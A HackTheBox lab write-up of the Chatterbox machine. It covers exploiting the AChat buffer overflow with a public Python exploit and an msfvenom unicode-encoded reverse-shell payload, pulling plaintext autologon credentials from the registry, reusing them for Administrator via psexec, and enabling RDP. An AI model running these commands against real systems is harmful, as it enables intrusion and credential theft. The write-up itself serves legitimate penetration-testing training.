---
title: "HTB Chatterbox - AChat Buffer Overflow and Registry Credentials"
date: 2026-05-21
draft: false
tags:
  - htb
  - windows
  - medium
  - buffer-overflow
  - metasploit
  - credential-reuse
  - rdp
  - write-up
description: "Chatterbox is a Medium Windows box running the AChat chat server, vulnerable to a classic stack buffer overflow. Foothold comes from a custom Python exploit with a unicode-encoded payload, and privesc is a gift left in the registry - autologon credentials that also work for Administrator."
ShowToc: true
cover:
  image: "/images/htb-chatterbox/cover.png"
  alt: "HTB Chatterbox machine avatar"
---

## Machine Information

| Field      | Details              |
|------------|----------------------|
| Name       | Chatterbox           |
| Platform   | HackTheBox           |
| OS         | Windows              |
| Difficulty | Medium               |

## TL;DR

AChat 0.150 beta7 is running on a non-standard port with a known buffer overflow. A public Python PoC gets us a shell as `alfred` after generating an x86 unicode-compatible reverse shell payload with msfvenom. Once in, the registry gives away autologon credentials (`Alfred:Welcome1!`) that also work for Administrator — straightforward credential reuse to SYSTEM.

## Recon

```bash
nmap -sC -sV -p- 10.129.1.92
```

{{< figure src="/images/htb-chatterbox/nmap-scan.png" alt="nmap scan showing AChat on ports 9255 and 9256, plus standard Windows RPC and SMB ports" >}}

Most of the ports are standard Windows noise — RPC, SMB. The interesting ones are 9255 and 9256, both identified as **AChat**. That's a Windows chat application that barely anyone runs outside of CTFs, which is a big hint there's something exploitable there.

## Foothold — AChat Buffer Overflow (CVE-2015-1577)

A quick searchsploit confirms what the nmap output was hinting at:

{{< figure src="/images/htb-chatterbox/searchsploit-achat.png" alt="searchsploit output showing AChat 0.150 beta7 Remote Buffer Overflow exploits" >}}

Two options: a Metasploit module and a standalone Python script. The Python one (`36025.py`) is more interesting - let's use that. I grabbed it with `searchsploit -m windows/remote/36025.py` and had a look.

The exploit sends a crafted UDP packet to AChat's listening port that overflows the stack and redirects execution. The payload embedded in the script by default is just a calculator shellcode — we need to swap it for a real reverse shell. The important constraint is the encoding: AChat's input processing strips non-ASCII bytes, so the payload needs to be **unicode-compatible**. msfvenom handles this with `x86/unicode_mixed`:

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=tun0 LPORT=443 -e x86/unicode_mixed BufferRegister=EAX \
  -f python -v buf
```

{{< figure src="/images/htb-chatterbox/msfvenom-payload.png" alt="msfvenom generating unicode-mixed encoded reverse shell payload" >}}

The `BufferRegister=EAX` tells the encoder that EAX points to the beginning of our buffer at the time of execution — that's how the decoder stub knows where to find and decode the payload. Without that, the unicode encoder would be shooting blind.

Once the payload is generated, paste it into 36025.py, set the target IP to the box, set up a listener, and run it:

{{< figure src="/images/htb-chatterbox/reverse-shell.png" alt="Python exploit running on the right producing P0OF success message, listener on the left catching shell as chatterbox\\alfred" >}}

The `{P0OF}!` message from the exploit means the overflow was triggered successfully. On the left, the listener catches the connection: `whoami` returns `chatterbox\alfred`.

### User flag

```bash
type Desktop\user.txt
```

{{< figure src="/images/htb-chatterbox/user-flag.png" alt="user.txt flag on Alfred's desktop" >}}

## Privilege Escalation — Registry Autologon Credentials

Once on the box as alfred, it's worth checking the registry for any stored credentials. Windows has a feature called **AutoAdminLogon** that lets the machine log in automatically on boot by storing credentials in plaintext in the registry:

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

{{< figure src="/images/htb-chatterbox/registry-credentials.png" alt="registry query showing AutoAdminLogon=1, DefaultUserName=Alfred, DefaultPassword=Welcome1!" >}}

There it is: `AutoAdminLogon = 1`, `DefaultUserName = Alfred`, `DefaultPassword = Welcome1!`. The machine is configured to auto-login as Alfred with that password. But the real question is whether Administrator reuses it.

```bash
nxc smb 10.129.1.92 -u Administrator -p 'Welcome1!'
```

{{< figure src="/images/htb-chatterbox/nxc-admin-pwned.png" alt="nxc smb showing Administrator:Welcome1! as Pwn3d on CHATTERBOX" >}}

Pwn3d. Same password. From here it's a one-liner:

```bash
impacket-psexec Administrator@10.129.1.92
```

{{< figure src="/images/htb-chatterbox/psexec-system.png" alt="impacket-psexec shell as nt authority\\system on Chatterbox" >}}

### Bonus: Enabling RDP

As SYSTEM I wanted to poke around the box visually, so I enabled RDP:

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
```

{{< figure src="/images/htb-chatterbox/enable-rdp.png" alt="registry command and firewall rule enabling RDP successfully" >}}

Then connected via FreeRDP and grabbed the root flag off the desktop:

{{< figure src="/images/htb-chatterbox/root-flag.png" alt="FreeRDP session showing root.txt flag open in Notepad on Administrator's desktop" >}}

## Takeaways

- **AutoAdminLogon is a gift** — if you're on a Windows box and privesc isn't obvious, always check `HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon`. Sysadmins set it for convenience and forget the password is sitting there in plaintext.
- **Credential reuse is almost always worth trying** — the Alfred password working for Administrator is lazy AD hygiene, but it's incredibly common on real networks too.
- **msfvenom encoding matters** — when the target application processes input through a character filter (unicode, alphanumeric, etc.), you need the right encoder. `x86/unicode_mixed` with `BufferRegister` set is the right call for AChat-style filters.
- **Non-standard ports deserve attention** — port 9255 running AChat could easily be missed in a quick scan. Full port scan (`-p-`) is worth the time.

## References

- [Exploit-DB: AChat 0.150 beta7 - Remote Buffer Overflow (Python)](https://www.exploit-db.com/exploits/36025)
- [msfvenom cheatsheet - unicode encoding](https://github.com/rapid7/metasploit-framework/blob/master/docs/msfvenom.md)
- [Windows AutoAdminLogon registry key](https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows)
